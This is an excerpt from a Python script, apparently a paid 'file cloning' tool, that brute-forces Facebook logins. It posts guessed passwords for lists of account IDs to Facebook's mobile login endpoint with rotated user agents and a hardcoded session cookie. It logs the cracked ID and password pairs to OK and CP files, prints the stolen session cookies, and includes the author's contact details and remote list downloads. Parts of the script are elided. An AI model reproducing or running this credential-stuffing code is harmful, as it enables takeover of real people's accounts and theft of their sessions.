...
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/01989181632WA?mibextid=ZbWKwL')
#------------------[ Ripon-king ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
princp=[]
try:
    prox= requests.get('https://github.com/HAKER-K1NG/File-cloning/blob/main/Abal-not-allow.txt').text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/HAKER-K1NG/File-cloning/blob/main/Abal-not-allow.txt').text
        ua=open('bbnew.txt','w')
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mRX-RIPON ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • Mafiya Ripon ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mRipon-king ]   ║\33[1;34m   
╠══[Whatsapp                 • 01989181632 ]  ║\33[1;35m 
╠══[TOOLS                    • PAID ]         ║ \33[1;32m   
╠══[VERSION                  • 5.6 ]          ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m"""
os.system('clear')
print(logo)
os.system('espeak -a 300 " Your,   Real,  Name,"')
uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
os.system('espeak -a 300 " Welcome,   to,  Ripon,  King,  Tools"')
pass
...
def menu():
    ...
    if TUTUL in ['111']:
        ...
        os.system('xdg-open https://wa.me/+8801989181632')
        os.system("python nono.py")
    elif TUTUL in ['3','03']:
        result()
    elif TUTUL in ['0']:
...
def crack_file():
    ...
    o = input('\033[97;1m[\033[92;1m+\033[97;1m] ENTER FILE NAME :\033[92;1m ')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[Ripon-M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    # 'cookie': 'datr=HSDTZYZ-cUGcZ2phBy-JaNIA; sb=HSDTZeVkNUg54Se3oKvrcA_N; ps_l=0; ps_n=0; zsh=AST0xgFuNOoQKF8ASI4VTlGsgr3q_sKNI3bH2WxlXAeREgb89vQX6FpfF0EUjDsqX1ArOF6CTUCpWxZfPmmg50nRxI3qrPu13eMfz8B_bcD-SbGM4S3dI-VWN9EWCyhIjqUkDMnqak18iaoYq9w46wCRx1xRbHnPsTRrPgpJkHLO-QXPXxn6jbeSMU5o5tV9JsIuX5XNq7cehuwbWA6LiJh5WDwQGRKDIDcU1dqlVgrAZqZ6wfA3r2ss0VR1lWnHqOouOBqYtV-FcT2OScO6XWX48kS5KPF0U1jHpF7q2nn92gD8Lk-bqlZTrXfdrLpy9mYQTbOd8Qa50QJOs1felMUNm2ersHE; m_pixel_ratio=2.1988937854766846; wd=891x1654; fr=0OelVkfxicxI7cOSQ.AWWAFgB4UCJs4Ga84bn5uhYbKms.Bl0yJ5..AAA.0.0.Bl0z5o.AWUKqpO4Q6E',
    'dpr': '2',
    ...
    'viewport-width': '980',
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[Ripon-Cp💔] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[Ripon-Ok❤️] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " Ripon,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[Ripon-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    ...
    'viewport-width': '980',
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Ripon-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Ripon-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  Ripon,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
